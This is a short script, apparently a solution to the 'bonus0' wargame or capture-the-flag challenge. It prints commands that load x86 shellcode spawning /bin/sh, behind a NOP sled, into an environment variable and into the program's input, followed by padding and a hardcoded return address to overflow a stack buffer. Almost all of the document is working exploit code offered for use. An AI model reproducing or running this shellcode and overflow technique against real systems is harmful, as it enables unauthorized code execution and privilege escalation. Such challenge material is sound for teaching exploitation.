# Working exploit for bonus0 (instructions)
# Step 0 (optional): place small shellcode+NOP in EGG environment variable
# NOTE: uses Python 2 syntax to generate raw bytes
# export EGG=$(python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

# Step 1: generate a large NOP slide + shellcode and send it as the first input
# Step 2: send padding + return address as the second input
# Use python2 for accurate print semantics

print("Run the following on the target system:\n")
print("export EGG=$(python -c \"print '\\x90' * 100 + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'\")  # optional\n")
print("(python2 -c \"print '\\x90'*3000 + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'\"; python2 -c \"print 'B'*14 + '\\xa4\\xe6\\xff\\xbf' + 'B'\"; cat) | ./bonus0\n")